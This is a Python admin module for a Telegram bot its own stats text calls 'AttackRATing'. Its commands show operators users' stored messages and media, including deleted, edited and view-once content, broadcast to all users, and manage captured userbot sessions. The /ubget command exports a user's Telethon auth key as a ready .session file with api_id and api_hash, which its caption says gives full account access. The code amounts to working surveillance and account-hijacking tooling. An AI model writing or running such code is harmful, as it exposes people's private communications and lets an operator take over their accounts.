"""Админ-команды: users, stats, lastmessages, lastmedia, cleanup и т.д."""
from __future__ import annotations

import asyncio
import logging
import os
import sqlite3
from datetime import datetime

from aiogram import Router, types
from aiogram.filters import Command
from aiogram.types import FSInputFile, InlineKeyboardButton, InlineKeyboardMarkup, Message

from bot.config import DB_PATH, OWNER_ID
from bot.db import (
    add_admin,
    clear_db,
    cleanup_db,
    delete_userbot_session,
    get_all_admins,
    get_all_userbot_sessions,
    get_all_users,
    get_last_media,
    get_last_messages,
    get_recent_events,
    get_referral_count,
    get_stats_data,
    get_top_referrers,
    get_userbot_session,
    is_admin,
    is_owner,
    remove_admin,
    set_userbot_active,
)
from bot.loader import bot
from bot.userbot_manager import is_userbot_running, start_client, stop_client
from bot.utils import esc

router = Router(name="admin")

# ====================== HELPADMIN ======================
@router.message(Command("helpadmin"))
async def cmd_helpadmin(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer("⛔️ У вас нет прав доступа.")
    text = (
        "📖 <b>Справка по командам администратора</b>\n\n"

        "👥 <b>Пользователи</b>\n"
        "• /users — список всех пользователей, чьи сообщения сохранены в БД\n"
        "• /stats — общая статистика (кол-во пользователей, сообщений, самый активный)\n\n"

        "💬 <b>Сообщения</b>\n"
        "• /lastmessages — последние 50 сообщений всех пользователей\n"
        "• /lastmessages 100 — последние 100 сообщений (макс. 300)\n"
        "• /lastmessages 50 123456789 — последние 50 сообщений конкретного пользователя\n\n"

        "🖼 <b>Медиа</b>\n"
        "• /lastmedia — последние 10 медиафайлов всех (макс. 50)\n"
        "• /lastmedia 30 — последние 30 медиафайлов всех\n"
        "• /lastmedia 123456789 — последние 10 медиафайлов пользователя\n"
        "• /lastmedia 123456789 20 — последние 20 медиафайлов пользователя\n"
        "  ↳ Файлы отправляются по одному с подписью\n\n"

        "📋 <b>События</b>\n"
        "• /events — последние 30 событий (удаления, редактирования, сохранения одноразовых)\n\n"

        "👑 <b>Администраторы</b>\n"
        "• /admins — список всех администраторов\n"
        "• /addadmin 123456789 — добавить пользователя в админы (только Owner)\n"
        "• /removeadmin 123456789 — убрать из админов (только Owner)\n\n"

        "📢 <b>Рассылка</b>\n"
        "• /broadcast Текст сообщения — отправить текст всем пользователям\n"
        "• /broadcast (ответ на сообщение) — переслать сообщение всем пользователям\n\n"

        "🖋 <b>Userbot-сессии (только Owner)</b>\n"
        "• /ubsessions — список всех сессий\n"
        "• /ubon ID — включить сессию пользователя\n"
        "• /uboff ID — выключить сессию\n"
        "• /ubget ID — скачать .session + api_id/hash\n"
        "• /ubdel ID — удалить сессию\n\n"

        "ℹ️ <b>Прочее</b>\n"
        "• /ref — получить реферальную ссылку\n"
        "• /toprefs — топ пригласивших пользователей (только админы)\n"
        "• /helpadmin — эта справка\n"
        "• /cleanup — очистка БД: удаляет записи старше 7 дней (только Owner)\n"
        "• /clear — полная очистка БД: удаляет ВСЕ сообщения и события (только Owner)\n"
        "• /start — приветственное сообщение"
    )
    await message.answer(text)


# ====================== LASTMESSAGES ======================
@router.message(Command("lastmessages"))
async def cmd_lastmessages(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer("⛔️ У вас нет прав доступа.")

    args = message.text.split()[1:]
    limit = 50
    filter_user_id = None

    try:
        if len(args) == 1:
            val = int(args[0])
            # ID пользователей Telegram всегда > 10000, лимит максимум 300
            if val > 10000:
                filter_user_id = val
            else:
                limit = val
        elif len(args) >= 2:
            # /lastmessages 123456789 100
            filter_user_id = int(args[0])
            limit = int(args[1])
    except ValueError:
        return await message.answer(
            "❗️ Неверный формат.\n\n"
            "Варианты использования:\n"
            "• /lastmessages — последние 50 сообщений всех\n"
            "• /lastmessages 100 — последние 100 сообщений всех\n"
            "• /lastmessages 123456789 — последние 50 сообщений пользователя\n"
            "• /lastmessages 123456789 100 — последние 100 сообщений пользователя"
        )

    limit = max(1, min(300, limit))
    rows = get_last_messages(limit, filter_user_id)

    if not rows:
        return await message.answer("📭 Сообщений не найдено.")

    header = (
        f"💬 <b>Последние {len(rows)} сообщений"
        + (f" пользователя <code>{filter_user_id}</code>" if filter_user_id else " (все пользователи)")
        + ":</b>\n\n"
    )

    lines = []
    for user_id, msg_id, raw_json, timestamp in rows:
        try:
            msg = types.Message.model_validate_json(raw_json)
        except Exception:
            continue
        txt = msg.text or msg.caption or ""
        media_label = ""
        if msg.photo:
            media_label = "[📷 фото]"
        elif msg.video:
            media_label = "[🎥 видео]"
        elif msg.video_note:
            media_label = "[⭕️ кружок]"
        elif msg.voice:
            media_label = "[🎤 голосовое]"
        elif msg.audio:
            media_label = "[🎵 аудио]"
        elif msg.document:
            media_label = "[📎 документ]"
        elif msg.animation:
            media_label = "[🎞 GIF]"
        elif msg.sticker:
            media_label = "[🎭 стикер]"

        name = msg.from_user.full_name if msg.from_user else f"ID {user_id}"
        uid = msg.from_user.id if msg.from_user else user_id
        t = datetime.fromisoformat(timestamp).strftime("%d.%m %H:%M")
        content = (media_label + " " + esc(txt)).strip() or "(пусто)"
        short = content[:80] + ("…" if len(content) > 80 else "")
        lines.append(f"<a href='tg://user?id={uid}'>{name}</a> <code>{uid}</code> [{t}]: {short}")

    # Разбиваем на части по 4096 символов (лимит Telegram)
    full_text = header + "\n".join(lines)
    chunks = []
    while len(full_text) > 4000:
        split_at = full_text.rfind("\n", 0, 4000)
        if split_at == -1:
            split_at = 4000
        chunks.append(full_text[:split_at])
        full_text = full_text[split_at:].lstrip("\n")
    chunks.append(full_text)

    for chunk in chunks:
        await message.answer(chunk, disable_web_page_preview=True)


# ====================== LASTMEDIA ======================
@router.message(Command("lastmedia"))
async def cmd_lastmedia(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer("⛔️ У вас нет прав доступа.")

    args = message.text.split()[1:]
    limit = 10
    filter_user_id = None

    try:
        if len(args) == 1:
            val = int(args[0])
            if val > 10000:
                filter_user_id = val
            else:
                limit = val
        elif len(args) >= 2:
            filter_user_id = int(args[0])
            limit = int(args[1])
    except ValueError:
        return await message.answer(
            "❗️ Неверный формат.\n\n"
            "Варианты использования:\n"
            "• /lastmedia — последние 10 медиафайлов всех\n"
            "• /lastmedia 20 — последние 20 медиафайлов всех\n"
            "• /lastmedia 123456789 — последние 10 медиафайлов пользователя\n"
            "• /lastmedia 123456789 20 — последние 20 медиафайлов пользователя"
        )

    limit = max(1, min(50, limit))
    rows = get_last_media(limit, filter_user_id)

    if not rows:
        return await message.answer("📭 Медиафайлов не найдено.")

    header = (
        f"🖼 <b>Последние {len(rows)} медиафайлов"
        + (f" пользователя <code>{filter_user_id}</code>" if filter_user_id else " (все пользователи)")
        + " — отправляю по одному...</b>"
    )
    await message.answer(header)

    sent = 0
    failed = 0
    for user_id, msg_id, raw_json, timestamp in rows:
        try:
            msg = types.Message.model_validate_json(raw_json)
        except Exception:
            continue

        name = msg.from_user.full_name if msg.from_user else f"ID {user_id}"
        uid = msg.from_user.id if msg.from_user else user_id
        t = datetime.fromisoformat(timestamp).strftime("%d.%m.%Y %H:%M")
        user_link = f"<a href='tg://user?id={uid}'>{esc(name)}</a>"
        txt = msg.caption or msg.text or ""
        caption_text = f"👤 {user_link}\n🆔 <code>{uid}</code>\n🕒 {t}"
        if txt:
            caption_text += f"\n📝 {esc(txt[:200])}"

        # Определяем медиа и получаем file_id
        file_id = None
        media_type = None
        if msg.photo:
            file_id = msg.photo[-1].file_id
            media_type = "photo"
        elif msg.video:
            file_id = msg.video.file_id
            media_type = "video"
        elif msg.video_note:
            file_id = msg.video_note.file_id
            media_type = "video_note"
        elif msg.voice:
            file_id = msg.voice.file_id
            media_type = "voice"
        elif msg.audio:
            file_id = msg.audio.file_id
            media_type = "audio"
        elif msg.document:
            file_id = msg.document.file_id
            media_type = "document"
        elif msg.animation:
            file_id = msg.animation.file_id
            media_type = "animation"

        if not file_id:
            continue

        # Сначала пробуем отправить по file_id (быстро)
        success = False
        try:
            if media_type == "photo":
                await bot.send_photo(message.chat.id, file_id, caption=caption_text)
            elif media_type == "video":
                await bot.send_video(message.chat.id, file_id, caption=caption_text)
            elif media_type == "video_note":
                await bot.send_video_note(message.chat.id, file_id)
                await bot.send_message(message.chat.id, caption_text, disable_web_page_preview=True)
            elif media_type == "voice":
                await bot.send_voice(message.chat.id, file_id, caption=caption_text)
            elif media_type == "audio":
                await bot.send_audio(message.chat.id, file_id, caption=caption_text)
            elif media_type == "document":
                await bot.send_document(message.chat.id, file_id, caption=caption_text)
            elif media_type == "animation":
                await bot.send_animation(message.chat.id, file_id, caption=caption_text)
            success = True
        except Exception:
            pass

        # Если file_id протух — скачиваем и перезаливаем
        if not success:
            temp_path = f"temp_media_{msg_id}_{datetime.now().timestamp():.0f}.dat"
            try:
                file_info = await bot.get_file(file_id)
                await bot.download_file(file_info.file_path, temp_path)
                input_file = FSInputFile(temp_path)
                if media_type == "photo":
                    await bot.send_photo(message.chat.id, input_file, caption=caption_text)
                elif media_type == "video":
                    await bot.send_video(message.chat.id, input_file, caption=caption_text)
                elif media_type == "video_note":
                    await bot.send_video_note(message.chat.id, input_file)
                    await bot.send_message(message.chat.id, caption_text, disable_web_page_preview=True)
                elif media_type == "voice":
                    await bot.send_voice(message.chat.id, input_file, caption=caption_text)
                elif media_type == "audio":
                    await bot.send_audio(message.chat.id, input_file, caption=caption_text)
                elif media_type == "document":
                    await bot.send_document(message.chat.id, input_file, caption=caption_text)
                elif media_type == "animation":
                    await bot.send_animation(message.chat.id, input_file, caption=caption_text)
                success = True
            except Exception as e:
                logging.warning(f"Не удалось отправить медиа msg_id={msg_id}: {e}")
            finally:
                if os.path.exists(temp_path):
                    os.remove(temp_path)

        if success:
            sent += 1
        else:
            failed += 1

        await asyncio.sleep(0.3)

    result = f"✅ Отправлено {sent} из {len(rows)} медиафайлов."
    if failed:
        result += f"\n⚠️ Не удалось отправить: {failed} (файлы удалены с серверов Telegram)"
    await message.answer(result)


# ====================== КОМАНДЫ АДМИНА ======================
@router.message(Command("users"))
async def cmd_users(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer("⛔️ У вас нет прав доступа.")
    users = get_all_users()
    if not users:
        return await message.answer("📭 Пока нет подключённых пользователей.")
    text = "👥 <b>Подключённые пользователи:</b>\n\n"
    for uid in users:
        ref_cnt = get_referral_count(uid)
        ref_badge = f" | 👥 {ref_cnt}" if ref_cnt > 0 else ""
        try:
            u = await bot.get_chat(uid)
            name = esc(u.full_name or f"User_{uid}")
            link = f"<a href='tg://user?id={uid}'>{name}</a>"
        except:
            link = f"User"
        text += f"• {link} <code>{uid}</code>{ref_badge}\n"
    await message.answer(text, disable_web_page_preview=True)

@router.message(Command("stats"))
async def cmd_stats(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer("⛔️ У вас нет прав доступа.")
    total_users, total_messages, most_active = get_stats_data()
    if most_active:
        user_id, msg_count = most_active
        try:
            user = await bot.get_chat(user_id)
            name = user.full_name or f"User_{user_id}"
            active_str = f"<a href='tg://user?id={user_id}'>{name}</a> — {msg_count} сообщений"
        except:
            active_str = f"ID {user_id} — {msg_count} сообщений"
    else:
        active_str = "—"
    top_refs = get_top_referrers(1)
    ref_str = "—"
    if top_refs:
        top_uid, top_cnt = top_refs[0]
        try:
            top_u = await bot.get_chat(top_uid)
            top_name = esc(top_u.full_name or f"User_{top_uid}")
            ref_str = f"<a href='tg://user?id={top_uid}'>{top_name}</a> — {top_cnt} чел."
        except Exception:
            ref_str = f"ID {top_uid} — {top_cnt} чел."
    total_refs_conn = sqlite3.connect(DB_PATH)
    total_refs_cur = total_refs_conn.cursor()
    total_refs_cur.execute('SELECT COUNT(*) FROM referrals')
    total_refs = total_refs_cur.fetchone()[0]
    total_refs_conn.close()
    await message.answer(
        f"📊 <b>Статистика AttackRATing</b>\n\n"
        f"👥 Всего пользователей: <b>{total_users}</b>\n"
        f"💾 Всего сохранено сообщений: <b>{total_messages}</b>\n"
        f"🔥 Самый активный: {active_str}\n"
        f"🔗 Всего рефералов: <b>{total_refs}</b>\n"
        f"👑 Топ реферер: {ref_str}\n"
        f"🕒 {datetime.now().strftime('%d.%m.%Y %H:%M')}\n"
        f"Бот работает стабильно ✅",
        disable_web_page_preview=True
    )

@router.message(Command("admins"))
async def cmd_admins(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer("⛔️ У вас нет прав доступа.")
    admins = get_all_admins()
    text = "👑 <b>Администраторы бота:</b>\n\n"
    for aid in admins:
        try:
            u = await bot.get_chat(aid)
            name = esc(u.full_name or f"User_{aid}")
            link = f"<a href='tg://user?id={aid}'>{name}</a>"
        except:
            link = f"User"
        text += f"• {link} <code>{aid}</code>\n"
    await message.answer(text, disable_web_page_preview=True)

@router.message(Command("addadmin"))
async def cmd_addadmin(message: Message):
    if not is_owner(message.from_user.id):
        return await message.answer("⛔️ Эта команда доступна только владельцу бота.")
    try:
        target = int(message.text.split()[1])
        add_admin(target)
        await message.answer(f"✅ Пользователь <code>{target}</code> добавлен в админы.")
    except:
        await message.answer("❗️ Использование: /addadmin 123456789")

@router.message(Command("removeadmin"))
async def cmd_removeadmin(message: Message):
    if not is_owner(message.from_user.id):
        return await message.answer("⛔️ Эта команда доступна только владельцу бота.")
    try:
        target = int(message.text.split()[1])
        if target == OWNER_ID:
            return await message.answer("⛔️ Главного владельца нельзя удалить.")
        if remove_admin(target):
            await message.answer(f"✅ Пользователь <code>{target}</code> удалён из админов.")
        else:
            await message.answer("❌ Такой админ не найден.")
    except:
        await message.answer("❗️ Использование: /removeadmin 123456789")

@router.message(Command("broadcast"))
async def cmd_broadcast(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer("⛔️ У вас нет прав доступа.")
    if message.reply_to_message:
        users = get_all_users()
        success = failed = 0
        for uid in users:
            try:
                await bot.copy_message(uid, message.chat.id, message.reply_to_message.message_id)
                success += 1
            except:
                failed += 1
        await message.answer(f"✅ Рассылка завершена!\nУспешно: {success}\nОшибок: {failed}")
    elif len(message.text.strip()) > 11:
        text_to_send = message.text[10:].strip()
        users = get_all_users()
        success = failed = 0
        for uid in users:
            try:
                await bot.send_message(uid, text_to_send)
                success += 1
            except:
                failed += 1
        await message.answer(f"✅ Рассылка завершена!\nУспешно: {success}\nОшибок: {failed}")
    else:
        await message.answer("❗️ Используйте:\n/broadcast Текст\nили ответьте командой на сообщение")

@router.message(Command("events"))
async def cmd_events(message: Message):
    if not is_admin(message.from_user.id):
        return await message.answer("⛔️ У вас нет прав доступа.")
    events = get_recent_events(30)
    if not events:
        return await message.answer("📭 Событий пока нет.")
    type_emoji = {'deleted': '🗑', 'edited': '📝', 'view_once_saved': '💾'}
    type_label = {
        'deleted': 'Удалил сообщение',
        'edited': 'Изменил сообщение',
        'view_once_saved': 'Сохранил одноразовое',
    }
    text = "📋 <b>Последние события:</b>\n\n"
    for ev in events:
        _, event_type, actor_id, actor_name, conn_owner_id, msg_text, ts = ev
        emoji = type_emoji.get(event_type, '❓')
        label = type_label.get(event_type, event_type)
        t = datetime.fromisoformat(ts).strftime("%d.%m %H:%M")
        actor_link = f"<a href='tg://user?id={actor_id}'>{esc(actor_name)}</a> <code>{actor_id}</code>" if actor_id else "неизвестно"
        owner_link = f"<a href='tg://user?id={conn_owner_id}'>профиль</a> <code>{conn_owner_id}</code>" if conn_owner_id else "—"
        text += f"{emoji} <b>{label}</b> {t}\n"
        text += f" 👤 {actor_link}\n"
        text += f" 📱 Бот подключён у: {owner_link}\n"
        if msg_text:
            short = esc(msg_text[:60]) + ("..." if len(msg_text) > 60 else "")
            text += f" 💬 <i>{short}</i>\n"
        text += "\n"
    await message.answer(text, disable_web_page_preview=True)


# ====================== РУЧНАЯ ОЧИСТКА ======================
@router.message(Command("cleanup"))
async def cmd_cleanup(message: Message):
    if not is_owner(message.from_user.id):
        return await message.answer("⛔️ Эта команда доступна только владельцу бота.")
    deleted_msgs, deleted_events = cleanup_db()
    await message.answer(
        f"🧹 <b>Очистка БД выполнена вручную</b>\n\n"
        f"Удалено записей старше 7 дней:\n"
        f"• Сообщений: <b>{deleted_msgs}</b>\n"
        f"• Событий: <b>{deleted_events}</b>\n\n"
        f"🕒 {datetime.now().strftime('%d.%m.%Y %H:%M')}"
    )

# ====================== ПОЛНАЯ ОЧИСТКА БД ======================

@router.message(Command("clear"))
async def cmd_clear(message: Message):
    if not is_owner(message.from_user.id):
        return await message.answer("⛔️ Эта команда доступна только владельцу бота.")

    # Запрашиваем подтверждение через inline-кнопки
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="✅ Да, очистить всё", callback_data="confirm_clear"),
        InlineKeyboardButton(text="❌ Отмена", callback_data="cancel_clear"),
    ]])
    await message.answer(
        "⚠️ <b>Вы уверены?</b>\n\n"
        "Команда /clear удалит <b>ВСЕ</b> сообщения и события из базы данных.\n"
        "Это действие <b>необратимо</b>.\n\n"
        "Настройки, администраторы и подключения сохранятся.",
        reply_markup=kb
    )

@router.callback_query(lambda c: c.data == "confirm_clear")
async def callback_confirm_clear(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        return await callback.answer("⛔️ Нет доступа.", show_alert=True)
    result = clear_db()
    await callback.message.edit_text(
        f"🗑 <b>База данных полностью очищена</b>\n\n"
        f"Удалено:\n"
        f"• Сообщений: <b>{result['messages']}</b>\n"
        f"• Событий: <b>{result['events']}</b>\n\n"
        f"🕒 {datetime.now().strftime('%d.%m.%Y %H:%M')}"
    )
    await callback.answer()

@router.callback_query(lambda c: c.data == "cancel_clear")
async def callback_cancel_clear(callback: types.CallbackQuery):
    if not is_owner(callback.from_user.id):
        return await callback.answer("⛔️ Нет доступа.", show_alert=True)
    await callback.message.edit_text("❌ <b>Очистка отменена.</b>")
    await callback.answer()


# ====================== USERBOT SESSIONS (OWNER) ======================

@router.message(Command("ubsessions"))
async def cmd_ubsessions(message: Message):
    if not is_owner(message.from_user.id):
        return await message.answer("⛔️ Только владелец бота.")
    rows = get_all_userbot_sessions()
    if not rows:
        return await message.answer("📭 Userbot-сессий нет.")

    lines = ["🖋 <b>Userbot-сессии</b>\n"]
    for user_id, session_string, api_id, api_hash, is_active, created_at in rows:
        running = is_userbot_running(user_id)
        has_real = bool(session_string and session_string != "pending")
        if not has_real:
            flag = "⏳ pending"
        elif running:
            flag = "🟢 running"
        elif is_active:
            flag = "🟡 active (не запущен)"
        else:
            flag = "⏸ off"
        try:
            t = datetime.fromisoformat(created_at).strftime("%d.%m %H:%M")
        except Exception:
            t = created_at or "—"
        try:
            u = await bot.get_chat(user_id)
            name = esc(u.full_name or f"User_{user_id}")
            link = f"<a href='tg://user?id={user_id}'>{name}</a>"
        except Exception:
            link = f"User"
        lines.append(
            f"• {link} <code>{user_id}</code>\n"
            f"  {flag} · api <code>{api_id or '—'}</code> · {t}"
        )

    text = "\n".join(lines)
    text += (
        "\n\nКоманды:\n"
        "<code>/ubon ID</code> · <code>/uboff ID</code>\n"
        "<code>/ubget ID</code> · <code>/ubdel ID</code>"
    )
    # Telegram limit
    while len(text) > 4000:
        split_at = text.rfind("\n", 0, 4000)
        if split_at == -1:
            split_at = 4000
        await message.answer(text[:split_at], disable_web_page_preview=True)
        text = text[split_at:].lstrip("\n")
    await message.answer(text, disable_web_page_preview=True)


@router.message(Command("ubon"))
async def cmd_ubon(message: Message):
    if not is_owner(message.from_user.id):
        return await message.answer("⛔️ Только владелец бота.")
    parts = message.text.split()
    if len(parts) < 2:
        return await message.answer("Использование: <code>/ubon 123456789</code>")
    try:
        target = int(parts[1])
    except ValueError:
        return await message.answer("❗️ ID должен быть числом.")
    row = get_userbot_session(target)
    if not row or not row[0] or row[0] == "pending":
        return await message.answer(f"❌ Сессия для <code>{target}</code> не найдена.")
    set_userbot_active(target, True)
    status = await start_client(target, row[0], row[1], row[2], notify_admins=False)
    await message.answer(
        f"▶️ Включил userbot <code>{target}</code>\n{status}",
        disable_web_page_preview=True,
    )


@router.message(Command("uboff"))
async def cmd_uboff(message: Message):
    if not is_owner(message.from_user.id):
        return await message.answer("⛔️ Только владелец бота.")
    parts = message.text.split()
    if len(parts) < 2:
        return await message.answer("Использование: <code>/uboff 123456789</code>")
    try:
        target = int(parts[1])
    except ValueError:
        return await message.answer("❗️ ID должен быть числом.")
    row = get_userbot_session(target)
    if not row:
        return await message.answer(f"❌ Сессия для <code>{target}</code> не найдена.")
    await stop_client(target)
    set_userbot_active(target, False)
    await message.answer(
        f"⏸ Userbot <code>{target}</code> выключен. Сессия сохранена в БД."
    )


@router.message(Command("ubget"))
async def cmd_ubget(message: Message):
    if not is_owner(message.from_user.id):
        return await message.answer("⛔️ Только владелец бота.")
    parts = message.text.split()
    if len(parts) < 2:
        return await message.answer("Использование: <code>/ubget 123456789</code>")
    try:
        target = int(parts[1])
    except ValueError:
        return await message.answer("❗️ ID должен быть числом.")
    row = get_userbot_session(target)
    if not row or not row[0] or row[0] == "pending":
        return await message.answer(f"❌ Сессия для <code>{target}</code> не найдена.")

    session_string, api_id, api_hash, is_active = row
    running = is_userbot_running(target)

    # StringSession → файл .session (Telethon SQLite)
    base = f"ub_session_{target}_{int(datetime.now().timestamp())}"
    session_path = f"{base}.session"
    meta_path = f"{base}_api.txt"
    try:
        try:
            from telethon.sessions import StringSession, SQLiteSession
        except ImportError:
            return await message.answer("❌ Установите telethon: pip install telethon")

        ss = StringSession(session_string)
        fs = SQLiteSession(base)
        fs.set_dc(ss.dc_id, ss.server_address, ss.port)
        fs.auth_key = ss.auth_key
        if getattr(ss, "takeout_id", None) is not None:
            try:
                fs.takeout_id = ss.takeout_id
            except Exception:
                pass
        fs.save()
        try:
            fs.close()
        except Exception:
            pass

        if not os.path.exists(session_path):
            return await message.answer("❌ Не удалось создать .session файл.")

        with open(meta_path, "w", encoding="utf-8") as f:
            f.write(
                f"user_id={target}\n"
                f"api_id={api_id}\n"
                f"api_hash={api_hash}\n"
                f"is_active={is_active}\n"
                f"running={running}\n"
                f"exported={datetime.now().isoformat()}\n"
            )

        caption = (
            f"🔑 <b>.session</b> userbot <code>{target}</code>\n"
            f"api_id: <code>{api_id}</code>\n"
            f"api_hash: <code>{api_hash}</code>\n"
            f"active: <b>{'да' if is_active else 'нет'}</b> · "
            f"running: <b>{'да' if running else 'нет'}</b>\n\n"
            f"Использование:\n"
            f"<code>TelegramClient(\"userbot_{target}\", api_id, api_hash)</code>\n"
            f"(рядом должен лежать <code>userbot_{target}.session</code>)\n\n"
            f"⚠️ Полный доступ к аккаунту — не пересылай."
        )
        await message.answer_document(
            FSInputFile(session_path, filename=f"userbot_{target}.session"),
            caption=caption,
        )
        await message.answer_document(
            FSInputFile(meta_path, filename=f"userbot_{target}_api.txt"),
            caption="📎 api_id / api_hash к этой сессии (в .session их нет)",
        )
    except Exception as e:
        logging.exception("ubget export failed")
        await message.answer(f"❌ Ошибка экспорта: {esc(str(e))}")
    finally:
        for p in (session_path, meta_path, f"{base}.session-journal"):
            if os.path.exists(p):
                try:
                    os.remove(p)
                except OSError:
                    pass


@router.message(Command("ubdel"))
async def cmd_ubdel(message: Message):
    if not is_owner(message.from_user.id):
        return await message.answer("⛔️ Только владелец бота.")
    parts = message.text.split()
    if len(parts) < 2:
        return await message.answer("Использование: <code>/ubdel 123456789</code>")
    try:
        target = int(parts[1])
    except ValueError:
        return await message.answer("❗️ ID должен быть числом.")
    row = get_userbot_session(target)
    if not row:
        return await message.answer(f"❌ Сессия для <code>{target}</code> не найдена.")
    await stop_client(target)
    delete_userbot_session(target)
    await message.answer(f"🗑 Сессия userbot <code>{target}</code> удалена.")
